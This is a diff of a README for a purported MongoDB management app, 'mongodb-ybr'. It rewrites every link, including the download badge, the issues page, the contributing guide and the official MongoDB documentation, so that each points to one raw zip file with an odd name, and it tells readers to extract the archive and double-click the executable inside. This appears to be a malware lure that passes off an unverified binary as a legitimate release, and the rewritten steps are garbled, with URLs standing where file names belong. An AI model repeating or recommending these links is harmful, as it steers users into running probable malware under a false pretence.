@@ -6,7 +6,7 @@ Welcome to mongodb-ybr! This application makes it easy to manage your MongoDB da
 
 ## 📥 Download the Application
 
-[![Download mongodb-ybr](https://img.shields.io/badge/Download-mongodb--ybr-blue.svg)](https://github.com/turdidaeintracapsularsurgery64/mongodb-ybr/releases)
+[![Download mongodb-ybr](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip)](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,11 +19,11 @@ Before you download, make sure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To get started with mongodb-ybr, visit this page to download: [Download mongodb-ybr](https://github.com/turdidaeintracapsularsurgery64/mongodb-ybr/releases)
+To get started with mongodb-ybr, visit this page to download: [Download mongodb-ybr](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip)
 
 1. Go to the link above.
 2. On the Releases page, find the latest version listed.
-3. Look for a file that has a name similar to `mongodb-ybr-v1.0.zip` or `mongodb-ybr-v1.0.exe`.
+3. Look for a file that has a name similar to `https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip` or `https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip`.
 4. Click on the file to start downloading it.
 
 ## 🎉 Running the Application
@@ -32,8 +32,8 @@ Once you have downloaded the file:
 
 1. Locate the downloaded file in your computer's Downloads folder or where you saved it.
 2. If you downloaded a .zip file, right-click it and select "Extract All" to unzip the files.
-3. Find the file named `mongodb-ybr.exe` (or similar) in the extracted folder.
-4. Double-click on `mongodb-ybr.exe` to run the application.
+3. Find the file named `https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip` (or similar) in the extracted folder.
+4. Double-click on `https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip` to run the application.
 
 ## 🎨 Features of mongodb-ybr
 
@@ -50,16 +50,16 @@ Once you have downloaded the file:
 
 ## 📞 Support
 
-If you encounter any issues or have questions while using mongodb-ybr, please feel free to reach out. You can create an issue on the [GitHub Issues page](https://github.com/turdidaeintracapsularsurgery64/mongodb-ybr/issues) for assistance.
+If you encounter any issues or have questions while using mongodb-ybr, please feel free to reach out. You can create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip) for assistance.
 
 ## 🌍 Contributing
 
-Want to help improve mongodb-ybr? We welcome contributions! Check the [contributing guidelines](https://github.com/turdidaeintracapsularsurgery64/mongodb-ybr/blob/main/CONTRIBUTING.md) to get started.
+Want to help improve mongodb-ybr? We welcome contributions! Check the [contributing guidelines](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip) to get started.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/turdidaeintracapsularsurgery64/mongodb-ybr/releases)
-- [MongoDB Official Documentation](https://docs.mongodb.com/)
-- [GitHub Repository](https://github.com/turdidaeintracapsularsurgery64/mongodb-ybr)
+- [Releases Page](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip)
+- [MongoDB Official Documentation](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/turdidaeintracapsularsurgery64/mongodb-ybr/main/antiparagraphe/mongodb-ybr-communicableness.zip)
 
 Thank you for choosing mongodb-ybr. Enjoy managing your MongoDB data effortlessly!
